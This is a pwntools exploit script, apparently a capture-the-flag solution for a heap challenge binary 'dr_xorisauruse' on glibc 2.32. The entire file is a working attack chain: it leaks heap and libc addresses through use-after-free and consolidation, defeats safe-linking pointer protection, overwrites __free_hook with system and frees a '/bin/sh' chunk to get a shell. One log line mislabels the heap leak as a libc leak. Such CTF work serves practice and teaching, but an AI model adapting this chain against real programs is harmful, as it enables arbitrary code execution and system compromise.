#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")

exe = ELF("dr_xorisauruse")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")
# context.log_level='debug'
context.terminal = ["alacritty","-e"]
# p = remote("addr", 1337)
p = process([exe.path])
def gdbs():
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# gdbs()
def protect(addr1,addr2):
    return addr1^(addr2>>12)

def alloc(size, data):
    sla('hoice:',b"1")
    sla("need:",str(size))
    sa("in:",data)

def show(idx):
    sla("hoice:",b'2')
    sla("ss:",str(idx))

def free(idx):
    sla("hoice:",'3')
    sla(":",str(idx))

def uaf(idx, data):
    sla('hoice:','4')
    sla(":",str(idx))
    sla(':','420')
    sa(":",data)

def trigger_consolidate(size):
    assert(size >= 0x500)
    sla(":",'1'*size)
for i in range(20):
    alloc(0x77,f"{i}"*0x20)
for i in range(19):
    free(i)
trigger_consolidate(0x500)
gdbs()
alloc(0x60,b"a"*0x10)
show(0)
p.recvuntil(b"a"*0x10)
addr= u64(p.recvuntil(b"\n",drop=True).ljust(8, b'\x00')) 
heap = addr - 0x610
log.info(f"leak libc: {hex(heap)}")
alloc(0x60,b"a"*0x9)
show(1)
p.recvuntil(b"a"*0x8)
addr = u64(p.recvuntil(b"\n",drop=True).ljust(8, b'\x00'))
libc.address = addr - 0x1b8c61
log.info(f"leak libc: {hex(libc.address)}")
# clear the bin 
alloc(114,b"clear bin")
adda = heap+0x5a0
uaf(2,p64(protect(libc.sym.__free_hook,adda)))
alloc(114,b"/bin/sh\x00")
alloc(114,p64(libc.sym.system))
free(2)




p.interactive()
# good luck pwning :)

